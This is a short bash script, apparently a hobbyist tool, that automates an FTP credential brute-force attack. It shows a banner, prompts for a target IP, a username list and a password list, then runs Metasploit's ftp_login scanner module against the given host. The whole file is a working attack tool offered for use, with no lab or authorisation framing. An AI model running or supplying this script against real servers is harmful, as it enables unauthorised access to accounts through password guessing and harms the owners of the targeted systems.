#! /bin/bash
# Author : Xcihad

clear


kirmizi="\e[31m"
yesil="\e[32m"
sari="\e[33m"
mavi="\e[36m"
mor="\e[34m"
reset="\e[0m"
author="\e[33mAuthor : \e[32mX\e[31mcihad \e[31mV1.0\e[0m"

banner(){
printf "\n"
printf "\n"
printf "     $mor██████  ██████  ██    ██ ████████ ███████      ██$reset \n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██           ██$reset \n"
printf "     $mor██████  ██████  ██    ██    ██    █████        ██$reset \n"
printf "     $mor██   ██ ██   ██ ██    ██    ██    ██      ██   ██$reset \n"
printf "     $mor██████  ██   ██  ██████     ██    ███████  █████ $reset \n"
printf "\n"
printf "\n"
printf "\e[1;77m\e[41m    FTP Bruteforce attack automation with Metasploit \e[0m\n"
printf "\n"
printf "\n"
printf "     ${author}\n"
}
banner

        echo ""
        read -p "$(echo -e "$kirmizi[$yesil+$kirmizi]$sari" RHOST address : "$kirmizi)" ip
        sleep 1
        printf "\n"
        read -p $' $kirmizi[$yesil+$kirmizi]$sari List of users : $kirmizi' listuser
        printf "\n"
        sleep 1
        read -p $' $kirmizi[$yesil+$kirmizi]$sari List of passwords : $kirmizi ' listpass
        printf "\n"
        printf $" --->$sari Necessary actions are being taken...\n"
        sleep 2
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of users: $listuser\n"
        sleep 1
        printf " $kirmizi[$yesil+$kirmizi]$yesil List of passwords: $listpass\n"
        sleep 2
        clear
        printf "\n"
        printf $" --->$sari Starting attack on $ip address\n"
        sleep 3 
        msfconsole -q -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS $ip ; set USER_FILE $listuser ; set PASS_FILE $listpass ; exploit ; "
